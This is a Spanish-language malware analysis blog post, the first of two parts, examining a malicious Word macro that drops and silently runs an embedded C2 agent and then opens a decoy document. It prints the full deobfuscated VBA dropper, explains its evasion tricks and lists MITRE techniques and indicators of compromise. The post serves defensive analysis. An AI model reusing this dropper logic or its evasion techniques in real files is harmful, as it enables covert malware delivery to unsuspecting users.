+++
title = '003 - Analizando un agente de C2 - Parte 1: el Dropper'
date = 2023-12-10T22:29:12-05:00
translationKey = '003-macro-dropper'
draft = false
description = 'En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta.'
cover = "/img/003-procExp.png"

+++

*This article is also available in [english](/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/)*

## 1. Introducción

En esta ocasión decidí analizar un agente de comando y control (C2), revisando la forma en cómo llega a sus víctimas y qué técnicas utiliza para evadir defensas y dificultar el análisis. Dado que el post completo sería muy largo, lo he dividido en dos partes: la primera parte se centrará en el análisis de la macro que actúa como dropper, mientras que la segunda parte se centrará en el análisis del payload (agente de C2).

El dropper elegido tiene como hash **22ce9042f6f78202c6c346cef1b6e532** y puede ser descargado del siguiente [enlace](https://bazaar.abuse.ch/sample/e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404/).

> **Disclaimer**: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.

## 2. Macros de Office: la técnica que no parece tener fin

Antes de iniciar con el análisis, quería ahondar un poco en qué son las macros y por qué son usualmente abusadas por atacantes.

Las macros son secuencias de comandos que nos permiten automatizar tareas en programas de Microsoft Office; pueden ser utilizadas para formatear texto, ejecutar cálculos, etc. Las macros [cuentan con los mismos privilegios que el programa donde se están ejecutando](https://learn.microsoft.com/en-us/office/dev/scripts/resources/vba-differences#security), por lo que tienen acceso completo al equipo bajo el contexto del usuario que ejecutó el programa de Office.

Las macros son de especial interés para los atacantes debido a las siguientes razones:
1. Les permite incrustar código en documentos legítimos, por lo que no tienen que convencer al usuario de descargar un programa.
2. La mayoría de usuarios está acostumbrado a utilizar programas de Office, y pueden recibir usualmente ese tipo de archivos por correo (especialmente en empresas).
3. Puede que los sistemas de antispam de la empresa de su víctima bloquee los archivos con extensión .exe; sin embargo, probablemente permiten archivos de Office.
4. La suite de Microsoft Office está ampliamente difundida, lo que aumenta la probabilidad de que el malware pueda ser ejecutado por su víctima.
5. Pueden ser utilizadas tanto en Windows como en MacOS.

El uso de Visual Basic para ejecutar comandos maliciosos es tan común que tiene una subtécnica de [MITRE ATT&CK asociada: T1059.005](https://attack.mitre.org/techniques/T1059/005/), en la página de MITRE se puede encontrar mayor información sobre cómo ha sido utilizada esa técnica en otras campañas de distribución de malware.

Microsoft [ha empezado a bloquear](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked) la ejecución de macros descargadas de internet en versiones recientes de Microsoft Office; sin embargo, aún muchas empresas y usuarios utilizan versiones desactualizadas, lo que permite que la técnica siga siendo ampliamente utilizada.


## 3. Análisis estático del archivo

Iniciamos el análisis obteniendo el hash del documento de Word malicioso:

| Algoritmo | Hash                                                             |
|-----------|------------------------------------------------------------------|
| MD5       | 22CE9042F6F78202C6C346CEF1B6E532                                 |
| SHA256    | E38C39E302DE158D22E8D0BA9CD6CC93 68817BC611418A5777D00B90A9341404 |

Luego, iniciamos el análisis con [_olevba_](https://github.com/decalage2/oletools/wiki/olevba) utilizando el parámetro -a para ver el análisis que ofrece la herramienta:

![alt text](/img/003-olevba-a.png "OleVBA analysis")

Vemos que _olevba_ nos advierte que se ejecuta la función **Document_Open** automáticamente cuando se abre el archivo (comportamiento típico de macros maliciosas, que evitan requerir interacción del usuario); adicionalmente, vemos ciertas cadenas de texto que _olevba_ considera sospechosas:

| String   | Descripción                                              |
|----------|----------------------------------------------------------|
| Environ  | Se utiliza para leer variables de entorno                |
| Open     | Se utiliza para abrir archivos                           |
| CopyFile | Se utiliza para copiar archivos                          |
| MkDir    | Se utiliza para crear directorios                        |
| Shell    | Puede ser utilizada para ejecutar comandos en el sistema |


En este caso, [a diferencia del artículo anterior](/es/posts/002-analyzing-a-malicious-macro), _olevba_ no detecta posibles indicadores de compromiso (IOC).

Seguimos con el análisis utilizando el parámetro -c para visualizar las macros:

![alt text](/img/003-olevba-c.png "OleVBA macros")

Al visualizar las macros, podemos evidenciar algunas técnicas que el atacante usó para dificultar el análisis y evadir defensas:
1. No se utilizan nombres de funciones ni variables fáciles de entender, lo que dificulta el análisis manual.
2. Se utiliza el método Replace para retirar, durante la ejecución de la macro, caracteres utilizados para engañar sistemas de identificación de patrones.

La segunda técnica es de especial interés, ya que puede engañar a programas que busquen patrones para identificar cadenas potencialmente sospechosas (URLs, IPs, extensiones, nombres de archivos, etc). Por ejemplo, se puede utilizar la siguiente expresión regular para buscar cadenas de texto que terminen en .zip o .exe:

```regex
\.(zip|exe)$
```

En la macro, se visualiza la cadena "do_mc_xs.zi_p", la cual no es detectada por la expresión regular; sin embargo, durante la ejecución se renombra a "domcxs.zip" para su posterior procesamiento.

Dado que la función tiene varias filas, y es dificil de entender con nombres de variable poco amigables, la exportamos a un archivo para "limpiarla" un poco:

```powershell
olevba.exe -c .\e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404.docm > macros.vba
```

Una vez exportada, identificamos que Document_Open() llama a la función "weoqzisdi___lorfar()":

![alt text](/img/003-documentOpen.png "Document Open Function")

Dado que no vemos que ninguna de las otras funciones contenga código, extraemos la función weoqzisdi___lorfar() para su análisis:

```vba
Sub weoqzisdi___lorfar()
    
    Dim path_weoqzisdi___file As String
    
    Dim file_weoqzisdi___name  As String
    
    Dim folder_weoqzisdi___name  As Variant
    Dim oAzedpp     As Object
    
    Set oAzedpp = CreateObject("Shell.Application")
    
    file_weoqzisdi___name = "vteijam hdgtra"
    
    folder_weoqzisdi___name = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    If Dir(folder_weoqzisdi___name, vbDirectory) = "" Then
        MkDir (folder_weoqzisdi___name)
    End If
    
    path_weoqzisdi___file = folder_weoqzisdi___name & file_weoqzisdi___name
    
    Dim FSEDEO      As Object
    Set FSEDEO = CreateObject("Scripting.FileSystemObject")
    
    FSEDEO.CopyFile Application.ActiveDocument.FullName, folder_weoqzisdi___name & Replace("do_mc_xs", "_", ""), TRUE
    Set FSEDEO = Nothing
    
    Name folder_weoqzisdi___name & Replace("do_mc_xs", "_", "") As folder_weoqzisdi___name & Replace("do_mc_xs.zi_p", "_", "")
    
    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name & Replace("do_mc_xs.zi_p", "_", "")).items
    
    Dim poueeds     As Integer
    Dim filewedum   As String
    
    poueeds = InStr(Application.System.Version, ".1")
    
    filewedum = 2
    
    If poueeds Then
        filewedum = 1
    End If
    
    Name folder_weoqzisdi___name & "word\embeddings\oleObject1.bin" As folder_weoqzisdi___name & "word\" & file_weoqzisdi___name & Replace(".z_ip", "_", "")
    
    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name & "word\" & file_weoqzisdi___name & Replace(".z_ip", "_", "")).items
    
    Name folder_weoqzisdi___name & "oleObject" & filewedum & ".bin" As folder_weoqzisdi___name & file_weoqzisdi___name & Replace(".e_xe", "_", "")
    
    Shell folder_weoqzisdi___name & file_weoqzisdi___name & Replace(".e_xe", "_", ""), vbNormalNoFocus
    
    Dim dokc_paeth  As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name folder_weoqzisdi___name & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    Documents.Open FileName:=dokc_paeth, ConfirmConversions:=False, _
                   ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
                   PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
                   WritePasswordTemplate:="", Format:=wdOpenFormatAuto, XMLTransform:=""
    
End Sub
```

Luego de eliminar las lineas extra, así como arreglar la identación, procedemos a renombrar las variables para hacerlas mas amigables:

![alt text](/img/003-replace.png "Replace names")

En este caso, tenemos suerte de que algunas de las variables mantienen su nombre original antes de concatenarse con otros caracteres, por lo que nos permite identificar fácilmente para qué son utilizadas. De no tener esa información, podemos deducir su función en base a cómo están siendo utilizadas.

Luego de cambiar el nombre a las variables largas, podemos empezar a avanzar fila por fila analizando lo que parece estar haciendo:

```vba
Sub weoqzisdi___lorfar()
    
    Dim mpath       As String
    Dim mfile       As String
    Dim mfolder     As Variant
    Dim mShellApplication As Object
    
    'Crea objeto Shell.Application
    Set mShellApplication = CreateObject("Shell.Application")
    
    'Asigna la cadena de texto "vteijam hdgtra" a variable mfile
    mfile = "vteijam hdgtra"
    
    'Asigna la ruta de la variable de entorno "USERPROFILE" concatenada con
    '\Wrdix concatenada con el segundo en el que se ejecutó la función y concatenada con "\"
    'Por ejemplo: C:\Users\tmn\Wrdix12\
    mfolder = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    'Verifica si el directorio existe y sino, lo crea
    If Dir(mfolder, vbDirectory) = "" Then
        MkDir (mfolder)
    End If
    
    'Asigna a la variable mpath la ruta + nombre del archivo (C:\Users\tmn\Wrdix12\vteijam hdgtra)
    mpath = mfolder & mfile
    
    Dim FSEDEO      As Object
    Set FSEDEO = CreateObject("Scripting.FileSystemObject")
    
    'Se utiliza el método CopyFile, cuya sintaxis es object.CopyFile source, destination, [ overwrite ]
    'Se copia el archivo que se está ejecutando en la ruta almacenada en la variable mfolder, siendo renombrado a domcxs
    'Para ello, se utilizó la función "Replace" para quitar los subguiones a la cadena "do_mc_xs"
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/copyfile-method
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/replace-function
    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder & Replace("do_mc_xs", "_", ""), TRUE
    Set FSEDEO = Nothing
    
    'Utilizando la función "Name", se cambia el nombre del archivo previamente copiado a domcxs.zip
    'La sintaxis es Name antiguoNombre As nuevoNombre
    'Se renombra mfolder\domcxs a mfolder\domcxs.zip
    'https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/name-statement
    Name mfolder & Replace("do_mc_xs", "_", "") As mfolder & Replace("do_mc_xs.zi_p", "_", "")
    
    'Extrae el archivo domcxs.zip a la ruta de mfolder
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & Replace("do_mc_xs.zi_p", "_", "")).items
    
    Dim poueeds     As Integer
    Dim filewedum   As String
    
    'Se valida si la versión de Word contiene ".1" y, dependiendo de eso, se asigna el valor a la variable filewedum
    poueeds = InStr(Application.System.Version, ".1")
    filewedum = 2
    If poueeds Then
        filewedum = 1
    End If
    
    'Se renombra el archivo mfolder\word\embeddings\oleObject1.bin a "mfoldder\word\vteijam hdgtra.zip"
    'El contenido de la variable mfile (vteijam hdgtra) fue asignado al inicio de la función
    Name mfolder & "word\embeddings\oleObject1.bin" As mfolder & "word\" & mfile & Replace(".z_ip", "_", "")
    
    'Extrae el contenido de "mfoldder\word\vteijam hdgtra.zip" en la ruta de mfolder
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & "word\" & mfile & Replace(".z_ip", "_", "")).items
    
    'Se renombra mfolder\oleObjectfilewedum.bin como mfolder\mfile.exe
    Name mfolder & "oleObject" & filewedum & ".bin" As mfolder & mfile & Replace(".e_xe", "_", "")
    
    'Se ejecuta el comando mfolder\mfile.exe sin cambiar la vista al nuevo proceso
    Shell mfolder & mfile & Replace(".e_xe", "_", ""), vbNormalNoFocus
    
    'Se guarda el archivo mfolder\word\embeddings\oleObject3.bin como C:\users\usuario\Documents\nombreDocumentoMalicioso.docx
    Dim dokc_paeth  As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name mfolder & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    'Se abre el archivo .docx recientemente creado
    
    Documents.Open FileName
    = dokc_paeth, ConfirmConversions
    = False, _
      ReadOnly
    = False, AddToRecentFiles
    = False, PasswordDocument
    = "", _
      PasswordTemplate
    = "", Revert
    = False, WritePasswordDocument
    = "", _
      WritePasswordTemplate
    = "", Format
    = wdOpenFormatAuto, XMLTransform
    = ""
    
End Sub
```

En base al análisis, parece que al abrirse el documento realiza las siguientes acciones:
1. Se copia el documento malicioso a una ruta dentro del perfil del usuario
2. Se cambia de nombre al documento y se le añade la extensión .zip
3. Se extrae el .zip
4. Se extrae un archivo .bin de los archivos previamente extraidos, se le cambia la extension a .zip
5. Se extrae el contenido del .zip, el cual contiene otro archivo .bin
6. Se cambia la extensión del nuevo archivo .bin a .exe 
7. Se ejecuta el .exe en segundo plano
8. Se extrae otro archivo del documento original (archivos obtenidos en el paso 3) y se copia en la carpeta "Documentos" del usuario con extensión .docx
9. Se abre el archivo .docx

Como parte del análisis vemos otra manera que utilizan los atacantes para evadir defensas: el binario malicioso (.exe) estuvo almacenado dentro de 2 archivos comprimidos, cada uno con extensión .bin. Si un antivirus buscara la firma del .exe no lo encontraría debido a que está comprimido; de igual manera, si se basase en el tipo de extensión para determinar el tipo de archivo, puede que no detecte los .bin como archivos comprimidos.

Ahora que ya tenemos una idea de qué está haciendo el documento malicioso, procedemos a ejecutarlo de manera controlada para verificar si el análisis fue el correcto.


## 4. Análisis dinámico del archivo

Antes de iniciar el análisis dinámico procedemos a abrir [_Procmon_ y _Process Explorer_](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), ya que sabemos que la macro interactúa con carpetas e inicia nuevos procesos.

Al intentar abrir el editor de Visual Basic (antes de hacer click en "Habilitar contenido"), nos percatamos que tiene contraseña:

![alt text](/img/003-password.png "Password Protected Macro")

Si bien el editor de Visual Basic no nos deja acceder al contenido sin tener la contraseña, ya pudimos visualizar las macros previamente por medio de _olevba_, lo que nos dice que Microsoft Office no almacena las macros cifradas en reposo, por lo que ponerles contraseña no es un control efectivo si lo que se busca es que no sean analizadas.

En este caso tenemos dos opciones:
1. Ejecutar el código VBA desde un archivo diferente (ya que lo obtuvimos previamente con _olevba_)
2. Evadir la restricción en el archivo original

En esta ocasión opté por la segunda opción (el cómo escapa del alcance del presente artículo, pero una rápida búsqueda en internet debe bastar).

Una vez se tiene la macro abierta, podemos usar la tecla F8 para avanzar instrucción por instrucción. Podemos usar la ventana "Locales" para ver la asignación de contenido en las variables conforme se van ejecutando las instrucciones:

![alt text](/img/003-locals.png "Use of locals")

La primera operación de interés que esperamos es la creación de una carpeta llamada Wrdix+número en la ruta del usuario (en este caso C:\users\tmn)

```vba
    mfolder = Environ$("USERPROFILE") & "\Wrdix" & "" & Second(Now) & "\"
    
    If Dir(mfolder, vbDirectory) = "" Then
        MkDir (mfolder)
    End If
```

Podemos comprobar que efectivamente se creó el directorio tanto inspeccionado la carpeta como por medio de _Procmon_:

![alt text](/img/003-folderCreated.png "New folder")

![alt text](/img/003-procmonfolder.png "Folder creation in ProcMon")

La siguiente operación que esperamos es que se copie el documento a la carpeta creada, que se le asigne el nombre domcxs.zip y que sea extraido:

```vba
    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder & Replace("do_mc_xs", "_", ""), True
    Name mfolder & Replace("do_mc_xs", "_", "") As mfolder & Replace("do_mc_xs.zi_p", "_", "")
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & Replace("do_mc_xs.zi_p", "_", "")).items
```
![alt text](/img/003-extractfolder.png "Document copied and extracted")

Luego, esperamos que se cambie el nombre del archivo word\embeddings\oleObject1.bin a "vteijam hdgtra.zip", que se extraiga y se cambie el nombre del archivo extraido a "vteijam hdgtra.exe"

```vba
    'Se renombra el archivo mfolder\word\embeddings\oleObject1.bin a "mfoldder\word\vteijam hdgtra.zip"
    Name mfolder & "word\embeddings\oleObject1.bin" As mfolder & "word\" & mfile & Replace(".z_ip", "_", "")

    'Extrae el contenido de "mfoldder\word\vteijam hdgtra.zip" en la ruta de mfolder
    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder & "word\" & mfile & Replace(".z_ip", "_", "")).items
    
    'Se renombra mfolder\filewedum.bin como mfolder\mfile.exe
    Name mfolder & "oleObject" & filewedum & ".bin" As mfolder & mfile & Replace(".e_xe", "_", "")
```

![alt text](/img/003-zip-exe.png "New zip just arrived")

Finalmente, se ejecuta el binario "vteijam hdgtra.exe":

![alt text](/img/003-execution.png "Executing exe")


Podemos validar la creación de un nuevo proceso en _Process Explorer_ y _Procmon_:

![alt text](/img/003-procExp.png "ProcExp exe")

![alt text](/img/003-procmonexe.png "Procmon exe")


Si bien ya se inició el programa embebido en el documento de Word, queda una tarea pendiente al atacante para no levantar sospechas:

```vba
    'Se guarda el archivo mfolder\word\embeddings\oleObject3.bin como C:\users\usuario\Documents\nombreDocumentoMalicioso.docx
    Dim dokc_paeth As String
    
    dokc_paeth = Environ$("USERPROFILE") & "\Documents\" & Application.ActiveDocument.Name & ".docx"
    
    If Dir(dokc_paeth) = "" Then
        Name mfolder & "word\embeddings\oleObject3.bin" As dokc_paeth
    End If
    
    'Se ejecuta el archivo recientemente creado
    
    Documents.Open FileName
     = dokc_paeth, ConfirmConversions
     = False, _
    ReadOnly
     = False, AddToRecentFiles
     = False, PasswordDocument
     = "", _
    PasswordTemplate
     = "", Revert
     = False, WritePasswordDocument
     = "", _
    WritePasswordTemplate
     = "", Format
     = wdOpenFormatAuto, XMLTransform
     = ""
```

![alt text](/img/003-newword.png "Creating decoy file")

![alt text](/img/003-decoy.png "Decoy file")

Al crear y abrir el nuevo archivo, a la víctima se le muestra el documento de Word que espera.

Finalmente, validamos en _Procmon_ que la segunda etapa empezó a realizar acciones:

![alt text](/img/003-agent.png "C2 agent")

El payload malicioso corresponde a un agente de C2, cuyo análisis exploraremos en la segunda parte del post.


## 5. Conclusiones

Como pudimos ver en el análisis, el explorar cómo funciona un dropper nos permite comprender las distintas técnicas que un atacante puede seguir para evitar que el malware que desarrollan sea identificado: sea ponerle contraseña a las macros, ofuscar (aunque levemente) los nombres de variables y funciones, o embeber los payloads maliciosos bajo múltiples capas y renombres, todo tiene como fin dificultar el análisis manual y la rápida identificación por parte de herramientas automatizadas que se basan en firmas y patrones conocidos.

Aún así, el comportamiento que realiza el documento (crear una carpeta, extraer archivos, ejecutar un .exe) no es estándar para un documento normal, por lo que aún hay posibilidades de detección analizando lo que hace el archivo al ser ejecutado.

Como parte de este análisis, pudimos identificar distintos indicadores de compromiso: archivos con un nombre estático, hashes de los distintos archivos comprimidos y ejecutables, así como carpetas creadas. Los IOC identificados se detallan en la sección 7.

El payload malicioso corresponde a un agente que se comunica con un servidor de Comando y Control, [en la segunda parte del post](/es/posts/004-analyzing-a-dotnet-c2-agent/) exploraremos cómo funciona el agente, las acciones que realiza y cómo podemos obtener posibles indicadores de compromiso de este.



## 6. Mapeo MITRE ATT&CK

| ID        | Táctica             | Técnica                                              | Descripción                                                 |
|-----------|---------------------|------------------------------------------------------|-------------------------------------------------------------|
| T1027.009 | Evasión de defensas | Obfuscated Files or Information: Embedded Payloads   | Se embebieron payloads maliciosos dentro del documento      |
| T1027.010 | Evasión de defensas | Obfuscated Files or Information: Command Obfuscation | Se utilizó el reemplazo de caracteres para ofuscar comandos |
| T1036.008 | Evasión de defensas | Masquerade File Type                                 | Se cambió la extensión de los archivos ejecutables a .bin   |
| T1204.002 | Ejecución           | User Execution: Malicious File                       | Requiere que el usuario ejecute un archivo malicioso        |
| T1059.005 | Ejecución           | Command and Scripting Interpreter: Visual Basic      | Se utilizó VBA para la ejecución de comandos                |


## 7. IOC

| IOC                              | Tipo     | Descripción                                             |
|----------------------------------|----------|---------------------------------------------------------|
| 22ce9042f6f78 202c6c346cef1b6e532 | Hash MD5 | .docm malicioso                                         |
| e31ac765d1e97 698bc1efe443325e497 | Hash MD5 | Comprimido malicioso (oleObject1.bin)                   |
| 59211a4e0f27d 70c659636746b61945a | Hash MD5 | Payload malicioso 1                                     |
| 1d493e326d91c 53e0f2f4320fb689d5f | Hash MD5 | Payload malicioso 2                                     |
| efed06b2fd437 d6008a10d470e2c519f | Hash MD5 | .docx falso (decoy)                                     |
| vteijam hdgtra.exe               | Nombre   | Ejecutable malicioso                                    |
| C:\\users\\[^\\]+\\Wrdix\d+$     | Ruta     | Ruta de archivo malicioso (C:\users\USUARIO\WrdixNUM)   |



